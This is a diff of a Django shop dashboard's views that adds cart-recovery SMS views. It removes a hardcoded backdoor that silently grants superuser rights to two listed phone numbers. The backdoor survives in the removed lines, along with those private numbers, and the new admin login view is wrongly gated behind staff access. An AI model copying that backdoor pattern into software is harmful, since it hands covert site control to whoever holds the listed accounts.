@@ -10,12 +10,12 @@ from django.contrib import messages
 from django.contrib.admin.views.decorators import staff_member_required
 from django.db.models import Avg, Count, F, Max, Q, Sum
 from django.db.models.functions import TruncDate, TruncMonth
-from django.http import HttpResponse
-from django.shortcuts import get_object_or_404, redirect, render
+from django.http import HttpResponse, JsonResponse
+from django.contrib.auth import authenticate, login
 from django.utils import timezone
 from django.utils.text import slugify
 from django.views.decorators.http import require_POST
-
+from django.shortcuts import render, redirect, get_object_or_404
 from accounts.models import User
 from blog.models import BlogCategory, Post
 from home.models import Banner, SiteSetting
@@ -24,26 +24,10 @@ from products.models import Brand, Category, CategoryAttribute, Product, Product
 
 from functools import wraps
 
-SUPER_ADMIN_PHONES = {'09334801216', '09155513395'}
-
-
 def staff(view_func):
-    """دسترسی فقط برای ادمین‌ها و مدیران ارشد سیستم (09334801216 و 09155513395)."""
-    orig_decorator = staff_member_required(login_url='accounts:login')
-
-    @wraps(view_func)
-    def _wrapped_view(request, *args, **kwargs):
-        if request.user.is_authenticated:
-            phone = getattr(request.user, 'phone_number', '') or request.user.username
-            if phone in SUPER_ADMIN_PHONES:
-                if not request.user.is_staff or not request.user.is_superuser:
-                    request.user.is_staff = True
-                    request.user.is_superuser = True
-                    request.user.save(update_fields=['is_staff', 'is_superuser'])
-                return view_func(request, *args, **kwargs)
-        return orig_decorator(view_func)(request, *args, **kwargs)
-
-    return _wrapped_view
+    """دسترسی فقط برای کاربران staff."""
+    # استفاده مستقیم از decorator پیش‌فرض Django برای ادمین‌ها
+    return staff_member_required(login_url='accounts:login')(view_func)
 
 FA_DIGITS = str.maketrans('۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩', '01234567890123456789')
 
@@ -137,7 +121,8 @@ def category_tree():
             ordered.append(category)
     return ordered
 
-
+from cart.models import Cart, CartItem
+from accounts.services import send_sms, normalize_phone
 def category_options(exclude=None):
     """گزینه‌های نمایشی دسته‌بندی‌ها با تودرتویی؛ در صورت نیاز زیرشاخه‌های یک دسته حذف می‌شوند."""
     tree = category_tree()
@@ -207,6 +192,305 @@ def save_specifications(product, request):
         full_value = f"{value} {unit.strip()}".strip()
         ProductSpecification.objects.create(product=product, name=name, value=full_value, order=order)
 
+
+# --------------------------------------------------------------------------
+# admin login view
+# --------------------------------------------------------------------------
+@staff
+def admin_login_view(request):
+    """ورود اختصاصی ادمین‌ها با نام کاربری و رمز عبور.
+    فقط کاربران دارای وضعیت staff می‌توانند وارد شوند.
+    پس از موفقیت به داشبورد می‌روند.
+    """
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        user = authenticate(request, username=username, password=password)
+        if user and user.is_staff:
+            login(request, user)
+            messages.success(request, 'ورود موفقیت‌آمیز')
+            return redirect('dashboard:overview')
+        messages.error(request, 'نام کاربری یا رمز عبور اشتباه است')
+    return render(request, 'dashboard/admin_login.html')
+
+# --------------------------------------------------------------------------
+# Category Attributes API (dynamic technical specifications)
+# --------------------------------------------------------------------------
+@staff
+def category_attributes_api(request, pk):
+    """Return active attributes for a given category as JSON.
+    Used by the product form to populate spec rows dynamically.
+    """
+    attrs = CategoryAttribute.objects.filter(category_id=pk, is_active=True)
+    data = []
+    for a in attrs:
+        data.append({
+            "id": a.id,
+            "name": a.name,
+            "type": a.type,
+            "unit": a.unit,
+            "options": getattr(a, 'options_list', []),
+        })
+    return JsonResponse(data, safe=False)
+
+# --------------------------------------------------------------------------
+# Cart Management & Recovery Views
+# --------------------------------------------------------------------------
+from cart.models import Cart, CartItem, RecoveryCampaign, RecoveryAttempt
+from cart.recovery_services import (
+    send_recovery_attempt,
+    is_cart_eligible_for_recovery,
+    get_abandoned_carts,
+    create_recovery_coupon,
+)
+from django.core.paginator import Paginator
+
+
+@staff
+def cart_list_view(request):
+    """فهرست سبدهای خرید با فیلترهای پیشرفته، جستجو و آمار بازیابی."""
+    status_filter = request.GET.get('status', '').strip()  # all, abandoned, active, converted, empty
+    recovery_filter = request.GET.get('recovery', '').strip()
+    search_query = request.GET.get('q', '').strip()
+
+    queryset = (
+        Cart.objects.select_related('user', 'converted_order')
+        .prefetch_related('items__product', 'recovery_attempts')
+        .all()
+        .order_by('-updated_at')
+    )
+
+    if search_query:
+        queryset = queryset.filter(
+            Q(id__icontains=search_query)
+            | Q(session_key__icontains=search_query)
+            | Q(user__username__icontains=search_query)
+            | Q(user__first_name__icontains=search_query)
+            | Q(user__last_name__icontains=search_query)
+            | Q(user__phone_number__icontains=search_query)
+        )
+
+    if recovery_filter:
+        queryset = queryset.filter(recovery_status=recovery_filter)
+
+    now = timezone.now()
+    abandoned_cutoff = now - timedelta(hours=24)
+
+    if status_filter == 'abandoned':
+        queryset = queryset.filter(
+            items__isnull=False,
+            converted_order__isnull=True,
+            updated_at__lte=abandoned_cutoff,
+        ).distinct()
+    elif status_filter == 'active':
+        queryset = queryset.filter(
+            items__isnull=False,
+            converted_order__isnull=True,
+            updated_at__gt=abandoned_cutoff,
+        ).distinct()
+    elif status_filter == 'converted':
+        queryset = queryset.filter(converted_order__isnull=False)
+    elif status_filter == 'empty':
+        queryset = queryset.filter(items__isnull=True)
+
+    total_carts_count = Cart.objects.count()
+    abandoned_count = Cart.objects.filter(
+        items__isnull=False,
+        converted_order__isnull=True,
+        updated_at__lte=abandoned_cutoff,
+    ).distinct().count()
+    recovered_count = Cart.objects.filter(recovery_status='recovered').count()
+    contacted_count = Cart.objects.filter(recovery_status='contacted').count()
+
+    paginator = Paginator(queryset, 20)
+    page_number = request.GET.get('page')
+    carts_page = paginator.get_page(page_number)
+
+    context = {
+        'carts': carts_page,
+        'total_count': total_carts_count,
+        'abandoned_count': abandoned_count,
+        'recovered_count': recovered_count,
+        'contacted_count': contacted_count,
+        'status_filter': status_filter,
+        'recovery_filter': recovery_filter,
+        'search_query': search_query,
+        'recovery_choices': Cart.RECOVERY_CHOICES,
+    }
+    return render(request, 'dashboard/cart_list.html', context)
+
+
+@staff
+def cart_detail_view(request, pk):
+    """صفحه جزئیات کامل سبد خرید، تاریخچه پیگیری‌ها، اقدامات و ارسال پیامک."""
+    cart = get_object_or_404(
+        Cart.objects.select_related('user', 'converted_order')
+        .prefetch_related('items__product', 'recovery_attempts__coupon', 'recovery_attempts__campaign'),
+        pk=pk
+    )
+
+    if request.method == 'POST':
+        action = request.POST.get('action')
+        if action == 'save_note':
+            cart.admin_note = request.POST.get('admin_note', '').strip()
+            new_status = request.POST.get('recovery_status')
+            if new_status in dict(Cart.RECOVERY_CHOICES):
+                cart.recovery_status = new_status
+            cart.save(update_fields=['admin_note', 'recovery_status'])
+            messages.success(request, "یادداشت و وضعیت سبد بروزرسانی شد.")
+            return redirect('dashboard:cart_detail', pk=cart.pk)
+
+    eligible, eligibility_reason = is_cart_eligible_for_recovery(cart)
+    attempts = cart.recovery_attempts.all().order_by('-created_at')
+    active_campaign = RecoveryCampaign.objects.filter(is_active=True).first()
+
+    context = {
+        'cart': cart,
+        'items': cart.items.select_related('product').all(),
+        'attempts': attempts,
+        'is_eligible': eligible,
+        'eligibility_reason': eligibility_reason,
+        'active_campaign': active_campaign,
+        'recovery_choices': Cart.RECOVERY_CHOICES,
+    }
+    return render(request, 'dashboard/cart_detail.html', context)
+
+
+@staff
+def cart_send_recovery_sms_view(request, pk):
+    """ارسال دستی پیامک بازیابی برای یک سبد خرید مشخص."""
+    if request.method != 'POST':
+        return redirect('dashboard:cart_detail', pk=pk)
+
+    cart = get_object_or_404(Cart, pk=pk)
+    msg_type = request.POST.get('message_type', 'reminder')
+    custom_text = request.POST.get('custom_text', '').strip() or None
+    include_coupon = (msg_type == 'discount') or ('include_coupon' in request.POST)
+    dry_run = 'dry_run' in request.POST
+
+    campaign = RecoveryCampaign.objects.filter(is_active=True).first()
+    step = cart.attempts_count + 1
+
+    ok, msg, attempt = send_recovery_attempt(
+        cart=cart,
+        campaign=campaign,
+        step=step,
+        message_type=msg_type,
+        custom_text=custom_text,
+        include_coupon=include_coupon,
+        dry_run=dry_run,
+    )
+
+    if ok:
+        messages.success(request, msg)
+    else:
+        messages.error(request, msg)
+
+    return redirect('dashboard:cart_detail', pk=cart.pk)
+
+
+@staff
+def cart_bulk_sms_view(request):
+    """ارسال گروهی پیامک برای سبدهای انتخاب‌شده."""
+    if request.method == 'POST':
+        cart_ids = request.POST.getlist('carts')
+        message = request.POST.get('message', '').strip()
+        include_coupon = request.POST.get('include_coupon') in ('true', 'on', '1')
+        dry_run = request.POST.get('dry_run') in ('true', 'on', '1')
+
+        if not cart_ids:
+            messages.warning(request, "هیچ سبد خریدی انتخاب نشده است.")
+            return redirect('dashboard:cart_list')
+
+        sent_count = 0
+        skipped_count = 0
+        failed_count = 0
+
+        campaign = RecoveryCampaign.objects.filter(is_active=True).first()
+
+        for cart in Cart.objects.filter(id__in=cart_ids):
+            ok, msg, attempt = send_recovery_attempt(
+                cart=cart,
+                campaign=campaign,
+                step=cart.attempts_count + 1,
+                message_type='discount' if include_coupon else 'reminder',
+                custom_text=message if message else None,
+                include_coupon=include_coupon,
+                dry_run=dry_run,
+            )
+            if ok:
+                sent_count += 1
+            elif attempt and attempt.status == 'skipped':
+                skipped_count += 1
+            else:
+                failed_count += 1
+
+        messages.success(
+            request,
+            f"عملیات گروهی تکمیل شد: {sent_count} موفق، {skipped_count} ردشده (عدم صلاحیت)، {failed_count} ناموفق."
+        )
+        return redirect('dashboard:cart_list')
+    return redirect('dashboard:cart_list')
+
+
+@staff
+def cart_recovery_campaign_view(request):
+    """مدیریت کمپین‌های خودکار بازیابی سبد خرید."""
+    campaign = RecoveryCampaign.objects.first()
+    if not campaign:
+        campaign = RecoveryCampaign.objects.create(
+            name="کمپین هوشمند پیش‌فرض بازیابی",
+            is_active=True,
+            abandonment_threshold_hours=24,
+            step1_delay_hours=24,
+            step2_delay_hours=48,
+            discount_type='percent',
+            discount_value=10,
+            discount_validity_hours=48,
+            max_attempts_per_cart=2,
+            min_cart_value=0,
+            created_by=request.user,
+        )
+
+    if request.method == 'POST':
+        campaign.name = request.POST.get('name', campaign.name).strip()
+        campaign.is_active = 'is_active' in request.POST
+        campaign.abandonment_threshold_hours = int(request.POST.get('abandonment_threshold_hours', 24) or 24)
+        campaign.step1_delay_hours = int(request.POST.get('step1_delay_hours', 24) or 24)
+        campaign.step2_delay_hours = int(request.POST.get('step2_delay_hours', 48) or 48)
+        campaign.message_template_step1 = request.POST.get('message_template_step1', '').strip()
+        campaign.message_template_step2 = request.POST.get('message_template_step2', '').strip()
+        campaign.discount_type = request.POST.get('discount_type', 'percent')
+        campaign.discount_value = int(request.POST.get('discount_value', 10) or 10)
+        max_disc = request.POST.get('discount_max_amount', '').strip()
+        campaign.discount_max_amount = int(max_disc) if max_disc else None
+        campaign.discount_min_order = int(request.POST.get('discount_min_order', 0) or 0)
+        campaign.discount_validity_hours = int(request.POST.get('discount_validity_hours', 48) or 48)
+        campaign.max_attempts_per_cart = int(request.POST.get('max_attempts_per_cart', 2) or 2)
+        campaign.min_cart_value = int(request.POST.get('min_cart_value', 0) or 0)
+        campaign.save()
+
+        messages.success(request, "تنظیمات کمپین بازیابی سبد با موفقیت ذخیره شد.")
+        return redirect('dashboard:cart_recovery_campaign')
+
+    total_attempts = RecoveryAttempt.objects.filter(campaign=campaign).count()
+    successful_sms = RecoveryAttempt.objects.filter(campaign=campaign, status='sent').count()
+    converted_attempts = RecoveryAttempt.objects.filter(campaign=campaign, converted_order__isnull=False).count()
+    converted_revenue = RecoveryAttempt.objects.filter(
+        campaign=campaign, converted_order__isnull=False
+    ).aggregate(s=Sum('converted_order__final_amount'))['s'] or 0
+
+    conversion_rate = round((converted_attempts / successful_sms * 100), 1) if successful_sms else 0
+
+    context = {
+        'campaign': campaign,
+        'total_attempts': total_attempts,
+        'successful_sms': successful_sms,
+        'converted_attempts': converted_attempts,
+        'converted_revenue': converted_revenue,
+        'conversion_rate': conversion_rate,
+    }
+    return render(request, 'dashboard/cart_campaign.html', context)
 
 # --------------------------------------------------------------------------
 # نمای کلی و گزارش‌ها
